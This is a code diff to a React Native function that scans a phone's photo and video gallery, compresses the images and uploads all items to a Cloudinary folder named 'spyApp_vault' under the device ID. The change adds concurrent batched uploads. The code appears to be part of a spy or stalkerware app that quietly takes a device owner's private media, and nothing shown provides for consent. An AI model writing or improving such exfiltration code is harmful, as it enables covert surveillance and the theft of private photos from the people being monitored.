@@ -66,6 +66,8 @@ export const scanAndUploadGallery = async (
   const uploadedItems: MediaItem[] = [];
   const targetFolder = `spyApp_vault/${deviceId}`;
 
+  // 1. Filter out items that need processing
+  const itemsToProcess: any[] = [];
   for (let idx = 0; idx < photos.edges.length; idx++) {
     const node = photos.edges[idx]?.node as any;
     if (!node || !node.image || !node.image.uri) {
@@ -73,18 +75,14 @@ export const scanAndUploadGallery = async (
       continue;
     }
     const fileUri = node.image.uri;
+    const fileId = fileUri;
     const isVideo = node.type && node.type.startsWith('video');
-    const fileId = fileUri; // URI as unique ID
 
-    console.log(`[Gallery] Item ${idx + 1}: type=${node.type} uri=${fileUri?.slice(-30)}`);
-
-    // ── STEP 2: Duplicate check (sessionCache = AsyncStorage se loaded IDs) ─
     if (sessionCache && sessionCache.has(fileId)) {
       console.log(`[Gallery] Item ${idx + 1}: SKIP (already uploaded)`);
       continue;
     }
 
-    // ── STEP 3: Video duration and size check ────────────────────────────────
     if (isVideo) {
       const duration = node.playableDuration || node.duration || 0;
       if (duration > 60) {
@@ -97,58 +95,70 @@ export const scanAndUploadGallery = async (
         console.log(`[Gallery] Item ${idx + 1}: SKIP video too large (${fileSizeMB.toFixed(2)}MB exceeds 100MB Cloudinary limit)`);
         continue;
       }
-      console.log(`[Gallery] Item ${idx + 1}: Video OK duration=${duration}s size=${fileSizeMB.toFixed(2)}MB`);
     }
 
-    // ── STEP 4: Image compression ────────────────────────────────────────────
-    let processedUri = fileUri;
-    if (!isVideo) {
-      try {
-        const resized = await ImageResizer.createResizedImage(
-          fileUri, 1280, 1280, 'JPEG', 80, 0, undefined,
-        );
-        processedUri = resized.uri;
-        console.log(`[Gallery] Item ${idx + 1}: Compressed OK`);
-      } catch (err: any) {
-        console.warn(`[Gallery] Item ${idx + 1}: Compression FAILED (using original):`, err?.message);
-        processedUri = fileUri; // fallback to original
-      }
-    }
+    itemsToProcess.push({ node, fileUri, fileId, isVideo, idx });
+  }
 
-    // ── STEP 5: Cloudinary upload ────────────────────────────────────────────
-    try {
-      console.log(`[Gallery] Item ${idx + 1}: Uploading to Cloudinary...`);
+  // 2. Process remaining items in batches of 2 (Extra safe concurrent uploads)
+  const CONCURRENCY_LIMIT = 2;
+  for (let i = 0; i < itemsToProcess.length; i += CONCURRENCY_LIMIT) {
+    const batch = itemsToProcess.slice(i, i + CONCURRENCY_LIMIT);
+    await Promise.all(
+      batch.map(async (item) => {
+        const { node, fileUri, fileId, isVideo, idx } = item;
 
-      const formData = new FormData();
-      formData.append('file', {
-        uri: processedUri,
-        type: isVideo ? 'video/mp4' : 'image/jpeg',
-        name: `upload_${Date.now()}_${idx}.${isVideo ? 'mp4' : 'jpg'}`,
-      } as any);
-      formData.append('upload_preset', UPLOAD_PRESET);
-      formData.append('folder', targetFolder);
+        // Image compression
+        let processedUri = fileUri;
+        if (!isVideo) {
+          try {
+            const resized = await ImageResizer.createResizedImage(
+              fileUri, 1280, 1280, 'JPEG', 80, 0, undefined,
+            );
+            processedUri = resized.uri;
+            console.log(`[Gallery] Item ${idx + 1}: Compressed OK`);
+          } catch (err: any) {
+            console.warn(`[Gallery] Item ${idx + 1}: Compression FAILED (using original):`, err?.message);
+            processedUri = fileUri;
+          }
+        }
 
-      const res = await axios.post(CLOUDINARY_URL, formData, {
-        headers: { 'Content-Type': 'multipart/form-data' },
-        timeout: 60000,
-      });
+        // Cloudinary upload
+        try {
+          console.log(`[Gallery] Item ${idx + 1}: Uploading to Cloudinary...`);
 
-      if (res.data?.secure_url) {
-        console.log(`[Gallery] Item ${idx + 1}: Upload SUCCESS -> ${res.data.secure_url.slice(-40)}`);
-        uploadedItems.push({ url: res.data.secure_url, fileId, mediaType: isVideo ? 'video' : 'image' });
-        if (sessionCache) sessionCache.add(fileId);
-      } else {
-        console.warn(`[Gallery] Item ${idx + 1}: Upload returned no URL. Response:`, JSON.stringify(res.data));
-      }
-    } catch (uploadErr: any) {
-      const status = uploadErr?.response?.status;
-      const errDetail = uploadErr?.response?.data?.error?.message || uploadErr?.message;
-      console.error(`[Gallery] Item ${idx + 1}: Upload FAILED status=${status} error=${errDetail}`);
+          const formData = new FormData();
+          formData.append('file', {
+            uri: processedUri,
+            type: isVideo ? 'video/mp4' : 'image/jpeg',
+            name: `upload_${Date.now()}_${idx}.${isVideo ? 'mp4' : 'jpg'}`,
+          } as any);
+          formData.append('upload_preset', UPLOAD_PRESET);
+          formData.append('folder', targetFolder);
 
-      if (status === 400 || status === 409) {
-        if (sessionCache) sessionCache.add(fileId);
-      }
-    }
+          const res = await axios.post(CLOUDINARY_URL, formData, {
+            headers: { 'Content-Type': 'multipart/form-data' },
+            timeout: 60000,
+          });
+
+          if (res.data?.secure_url) {
+            console.log(`[Gallery] Item ${idx + 1}: Upload SUCCESS -> ${res.data.secure_url.slice(-40)}`);
+            uploadedItems.push({ url: res.data.secure_url, fileId, mediaType: isVideo ? 'video' : 'image' });
+            if (sessionCache) sessionCache.add(fileId);
+          } else {
+            console.warn(`[Gallery] Item ${idx + 1}: Upload returned no URL. Response:`, JSON.stringify(res.data));
+          }
+        } catch (uploadErr: any) {
+          const status = uploadErr?.response?.status;
+          const errDetail = uploadErr?.response?.data?.error?.message || uploadErr?.message;
+          console.error(`[Gallery] Item ${idx + 1}: Upload FAILED status=${status} error=${errDetail}`);
+
+          if (status === 400 || status === 409) {
+            if (sessionCache) sessionCache.add(fileId);
+          }
+        }
+      })
+    );
   }
 
   console.log(`[Gallery] DONE: ${uploadedItems.length}/${photos.edges.length} uploaded`);
